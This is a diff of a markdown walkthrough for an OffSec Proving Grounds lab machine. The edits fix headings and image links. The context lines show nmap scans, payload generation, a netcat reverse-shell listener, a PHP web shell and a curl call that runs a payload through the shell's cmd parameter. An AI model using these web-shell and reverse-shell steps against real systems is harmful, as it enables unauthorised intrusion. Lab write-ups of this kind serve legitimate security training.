@@ -30,7 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 85.66 seconds
 
 ```
 
-##HTTP TCP/80
+## HTTP TCP/80
 
 ```console
 root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nmap -Pn -sT -sV --script=http-enum -n 192.168.111.132 -p 80
@@ -49,7 +49,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds
 ```
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum//img/1.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum//img/1.png)
 
 ```console
 root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# curl -i http://192.168.111.132/robots.txt
@@ -65,7 +65,7 @@ Content-Type: text/plain
 Allow: Enum_this_Box
 ```
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/2.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/2.png)
 
 ```console
 root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# searchsploit Zerion
@@ -84,17 +84,17 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 3023 bytes
 ```
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/4.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/4.png)
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/5.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/5.png)
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/6.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/6.png)
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/7.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/7.png)
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/8.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/8.png)
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/9.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/9.png)
 
 ```console
 root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nc -lvnp 80
@@ -134,9 +134,9 @@ root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# nano myshell.php
 ?>
 ```
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/10.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/10.png)
 
-![Web](![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/11.png)
+![Web](https://github.com/jenriquezv/offsec_pg/blob/main/FunboxEasyEnum/img/11.png)
 
 ```console
 root@kali:/OSCPv3/offsec_pg/FunboxEasyEnum# curl -i http://192.168.111.132/myshell.php?cmd=./shell.elf
